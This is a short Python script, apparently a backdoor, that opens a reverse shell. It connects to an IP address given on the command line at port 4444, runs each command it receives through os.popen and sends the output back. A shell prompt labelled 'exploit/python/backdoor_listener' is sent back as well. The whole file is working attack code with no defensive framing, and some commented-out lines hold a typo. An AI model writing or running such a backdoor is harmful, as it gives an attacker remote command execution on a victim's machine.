import socket
import os
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = sys.argv[1]
s.connect_ex((ip, 4444))
while True:
	dados = s.recv(2048)
	#proc = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout-subprocess.PIPE, stderr=subprocess.PIPE)
	#conn = s.accept()
	attack = os.popen(dados)
	s.send(attack.read())
	s.send(">DE'DSEC:/(exploit/python/backdoor_listener)OS_SHELL: ")
	#output = proc.stdout.read() + proc.stderr.read()
